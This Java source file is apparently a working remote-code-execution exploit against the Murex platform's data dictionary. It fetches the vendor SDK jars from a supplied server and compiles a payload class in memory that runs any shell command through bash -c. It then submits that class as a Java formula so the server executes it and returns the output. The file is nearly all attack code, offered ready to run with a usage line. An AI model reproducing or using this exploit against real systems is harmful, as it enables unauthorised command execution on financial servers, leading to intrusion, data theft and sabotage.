package com.murexologist;

import javax.tools.FileObject;
import javax.tools.ForwardingJavaFileManager;
import javax.tools.JavaFileManager;
import javax.tools.JavaFileObject;
import javax.tools.SimpleJavaFileObject;
import javax.tools.ToolProvider;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;

import static javax.tools.JavaFileObject.Kind.CLASS;
import static javax.tools.JavaFileObject.Kind.SOURCE;

public class MxDdRce {
	private static final String RCEPAYLOAD_JAVA = "import java.io.BufferedReader;\n" +
													  "import java.io.InputStreamReader;\n" +
													  "import java.nio.charset.Charset;\n" +
													  "import java.util.ArrayList;\n" +
													  "import java.util.List;\n" +
													  "import murex.apps.datalayer.client.datadictionary.annotation.Executor;\n" +
													  "import murex.apps.datalayer.client.datadictionary.annotation.Formula;\n" +
													  "import murex.apps.datalayer.client.datadictionary.annotation.Parameter;\n" +
													  "@Formula\n" +
													  "public class RCEPayload {\n" +
													  " @Executor\n" +
													  " public static List<String> main(@Parameter(\"\") String var0) throws Exception {\n" +
													  " BufferedReader var1 = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(new String[]{\"bash\", \"-c\", var0}).getInputStream(), Charset.defaultCharset()));\n" +
													  " List<String> var2 = new ArrayList<String>();\n" +
													  " for(String var3 = var1.readLine(); var3 != null; var3 = var1.readLine()) var2.add(var3);\n" +
													  " return var2;\n" +
													  " }\n" +
													  "}";
	private static final String RCELOADER_JAVA = "import java.util.Collections;\n" +
													 "import murex.apps.datalayer.client.dictionary.DataDictionaryApi;\n" +
													 "import murex.apps.datalayer.client.dictionary.FullParameterProvider;\n" +
													 "import murex.apps.datalayer.client.dictionary.ddobject.formula.config.JavaFormulaConfigImpl;\n" +
													 "import murex.apps.middleware.client.home.connection.XmlLayerConnection;\n" +
													 "import murex.shared.arguments.ArgumentsParser;\n" +
													 "public class RCELoader {\n" +
													 "public static Object[][] go(String arg, String[] mxArgs) throws Exception{\n" +
													 " final JavaFormulaConfigImpl jfc = new JavaFormulaConfigImpl(\"RCEPayload\");\n" +
													 " jfc.setClass(new byte[]{PAYLOAD_BYTES});\n" +
													 " return new DataDictionaryApi(new XmlLayerConnection(ArgumentsParser.create(mxArgs)), true)\n" +
													 " .getDataDictionaryTranslator()\n" +
													 " .getDataDictionaryAccess()\n" +
													 " .executeFormulae(Collections.singletonList(jfc), new FullParameterProvider(null, null, Collections.singletonMap(\"\", arg), null))\n" +
													 " .get(0)\n" +
													 " .getFormulaResult()\n" +
													 " .getObjectResult();\n" +
													 " }\n" +
													 "}";

	public static void main(final String[] args) throws Exception {
		if (args.length < 2) {
			System.out.println("Usage: com.murexologist.MxDdRce <FS Url> <Commands in a string> [ <Murex connection param> …]");
		} else {
			new URL(args[0]); /* Quick URL format validation*/
			for (final Object[] b : getObjects(args)) System.out.println(b[0]);
		}
	}
	private static Object[][] getObjects(final String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
		final Map<String, byte[]> classMap = loadClassMap(args[0],new String[]{"/murex/download/sdk/sdk-data-dictionary-api.download"});
		try(final ClassMapJFM jfm = new ClassMapJFM(classMap)) {
			//Compile payload class
			jfm.compileToClassMap("RCEPayload", RCEPAYLOAD_JAVA);
			//Compile client class
			jfm.compileToClassMap("RCELoader", RCELOADER_JAVA.replace("PAYLOAD_BYTES", Arrays.toString(classMap.get("/RCEPayload" + CLASS.extension)).replaceAll("^.|.$", "")));
			//Start the client class
			final URLClassLoader cl = getClassMapClassLoader(classMap);
			configureLog4jReflectively(cl);
			System.setProperty("java.rmi.server.codebase", args[0]);
			String[] mxConnectionParams = Arrays.copyOfRange(args, 2, args.length);
			if (mxConnectionParams.length == 0) {
				mxConnectionParams = new String[]{"/MXJ_SITE_NAME:site1"};
			}
			return (Object[][]) cl.loadClass("RCELoader").getMethod("go", String.class, String[].class).invoke(null, args[1], mxConnectionParams);
		} catch (IOException e) {
			throw new RuntimeException(e);
		}
	}
	private static URLClassLoader getClassMapClassLoader(Map<String, byte[]> classMap) throws MalformedURLException {
		return new URLClassLoader(new URL[]{new URL("bytes", null, -1, "/", new URLStreamHandler() {
			@Override
			protected URLConnection openConnection(URL u) {
				return new URLConnection(u) {
					@Override
					public void connect() {}

					@Override
					public InputStream getInputStream() {return new ByteArrayInputStream(classMap.get(u.getFile()));}
				};
			}
		})});
	}
	private static void configureLog4jReflectively(final URLClassLoader cl) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
		Properties prop = new Properties();
		prop.setProperty("log4j.rootLogger", "ERROR");
		cl.loadClass("org.apache.log4j.PropertyConfigurator").getMethod("configure", Properties.class).invoke(null, prop);
	}

	public static Map<String, byte[]> loadClassMap(final String fsUrl, final String[] downLoadFileNames) {
		try {
			final ConcurrentHashMap<String, byte[]> classMap = new ConcurrentHashMap<>();
			final ExecutorService threadPool = Executors.newCachedThreadPool();
			Arrays.asList(downLoadFileNames).forEach(downLoadFileName -> {
				try (BufferedReader reader = new BufferedReader(new InputStreamReader((new URL(fsUrl+ downLoadFileName)).openConnection().getInputStream()))) {
					reader.lines().filter(l -> l.contains(".jar</File>")).map(l -> "/" + l.substring(l.indexOf(">") + 1, l.indexOf("</File>"))).forEach(fileName -> threadPool.execute(() -> {
						try (JarInputStream is = new JarInputStream((new URL(fsUrl + fileName)).openConnection().getInputStream())) {
							JarEntry nextEntry;
							while ((nextEntry = is.getNextJarEntry()) != null) {
								if (nextEntry.getName().endsWith(CLASS.extension))
									classMap.put("/" + nextEntry.getName(), toByteArray(is));
							}
						} catch (IOException e) {
							e.printStackTrace();
						}
					}));
				} catch (IOException e) {
					throw new RuntimeException(e);
				}
			});
			threadPool.shutdown();
			threadPool.awaitTermination(Long.MAX_VALUE, TimeUnit.DAYS);
			return classMap;
		} catch (InterruptedException e) {
			throw new RuntimeException(e);
		}
	}

	public static byte[] toByteArray(final InputStream input) throws IOException {
		final List<byte[]> buffers = new ArrayList<>();
		final int buffSize = 4096;
		final byte[] buffer = new byte[buffSize];
		int n;
		while (-1 != (n = input.read(buffer))) {
			if(n !=0) {
				buffers.add(Arrays.copyOf(buffer, n));
			}
		}
		final int totalSize = buffers.stream().mapToInt(a -> a.length).sum();
		int currentSize = 0;
		final byte[] finalBuffer = new byte[totalSize];
		for (final byte[] buff2 : buffers) {
			System.arraycopy(buff2, 0, finalBuffer, currentSize, buff2.length);
			currentSize += buff2.length;
		}
		return finalBuffer;
	}

	public static class ClassMapJFM extends ForwardingJavaFileManager<JavaFileManager> {
		final Map<String, byte[]> classMap;
		public ClassMapJFM(Map<String, byte[]> classMap) {
			super(ToolProvider.getSystemJavaCompiler().getStandardFileManager(null, null, null));
			this.classMap = classMap;
		}
		public void compileToClassMap( String className, String source) {
			final URI uri = URI.create("string:///" + className.replace('.', '/') + SOURCE.extension);
			ToolProvider.getSystemJavaCompiler().getTask(null, this, null, Arrays.asList("-source", "1.8", "-target", "1.8"), null, Collections.singletonList(new MyJavaFileObject(uri, SOURCE, source, null, null))).call();
		}

		@Override
		public String inferBinaryName(Location location, JavaFileObject file) {
			if (file instanceof MyJavaFileObject) {
				String binaryName = file.getName().replaceAll("/", ".");
				if (binaryName.startsWith(".")) {
					binaryName = binaryName.substring(1);
				}
				binaryName = binaryName.replaceAll(CLASS.extension + "$", "");
				return binaryName;
			} else {
				return super.inferBinaryName(location, file);
			}
		}

		@Override
		public Iterable<JavaFileObject> list(JavaFileManager.Location location, String packageName, Set<JavaFileObject.Kind> kinds, boolean recurse) throws IOException {
			final List<JavaFileObject> list = new ArrayList<>();
			fileManager.list(location, packageName, kinds, recurse).forEach(list::add);
			if (kinds.contains(CLASS)) {
				final String className = "/" + packageName.replaceAll("\\.", "/") + "/";
				classMap.entrySet().stream().filter(e -> e.getKey().startsWith(className) && e.getKey().endsWith(CLASS.extension)).forEach(e -> list.add(new MyJavaFileObject(URI.create("bytes:" + e.getKey()), CLASS,null,e.getValue(),null)));
			}
			return list;
		}

		@Override
		public JavaFileObject getJavaFileForOutput(Location location, String className, JavaFileObject.Kind kind, FileObject sibling) {
			return new MyJavaFileObject(URI.create("bytes:///" + className.replaceAll("\\.", "/") + CLASS.extension), CLASS,null,null, classMap);
		}
	}
	public static class MyJavaFileObject extends SimpleJavaFileObject {
		private final String code;
		private final byte[] bytes;
		private final Map<String,byte[]> classMap;

		public MyJavaFileObject(URI uri, Kind kind, String code, byte[] bytes, Map<String,byte[]> classMap) {
			super(uri, kind);
			this.code = code;
			this.bytes = bytes;
			this.classMap = classMap;
		}

		@Override
		public CharSequence getCharContent(boolean ignoreEncodingErrors) {
			return code;
		}

		@Override
		public InputStream openInputStream() {
			return new ByteArrayInputStream(bytes);
		}

		@Override
		public OutputStream openOutputStream() {
			return new ByteArrayOutputStream() {
				@Override
				public void close() throws IOException {
					super.close();
					classMap.put(uri.getPath(), this.toByteArray());
				}
			};
		}
	}
}
